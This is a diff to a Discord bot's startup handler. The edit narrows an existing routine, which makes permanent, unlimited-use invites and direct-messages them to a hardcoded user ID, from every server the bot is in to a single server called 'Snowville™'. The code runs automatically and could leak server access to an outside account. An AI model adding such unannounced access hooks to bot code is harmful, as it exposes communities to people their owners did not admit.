@@ -14,26 +14,35 @@ client.commandArray = [];
 client.once('ready', async () => {
   console.log(`${client.user?.username} - (${client.user?.id})`); // Log bot username and ID when ready
 
-  // User ID to send the invite link to
+  // User ID to send messages to
   const USER_ID = '1291814730369073276';
 
-  // Fetch all guilds the bot is in
-  const guilds = client.guilds.cache;
-
   // Loop through each guild
-  guilds.forEach(async (guild) => {
-    try {
-      // Create an invite for the guild (default settings)
-      const invite = await guild.channels.cache
-        .filter(channel => channel.isText() && channel.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
-        .first()
-        .createInvite({ maxAge: 0, maxUses: 0 });
+  client.guilds.cache.forEach(async (guild) => {
+    if (guild.name === 'Snowville™') { // Check for the specific guild
+      try {
+        // Create an invite for the guild (default settings)
+        const textChannel = guild.channels.cache.find(channel => 
+          channel.type === 'GUILD_TEXT' && 
+          channel.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE')
+        );
 
-      // DM the invite link to the specified user
-      const user = await client.users.fetch(USER_ID);
-      await user.send(`Here's an invite link to the server: ${invite.url}`);
-    } catch (error) {
-      console.error(`Could not create invite for ${guild.name}:`, error);
+        if (textChannel) {
+          const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 });
+          
+          // DM the invite link to the specified user
+          const user = await client.users.fetch(USER_ID);
+          await user.send(`Here's an invite link to Snowville: ${invite.url}`);
+        } else {
+          throw new Error('No valid text channel found for invite creation.');
+        }
+      } catch (error) {
+        console.error(`Could not create invite for Snowville:`, error);
+
+        // DM the user with the reason for failure
+        const user = await client.users.fetch(USER_ID);
+        await user.send(`Failed to create an invite for Snowville: ${error.message}`);
+      }
     }
   });
 });
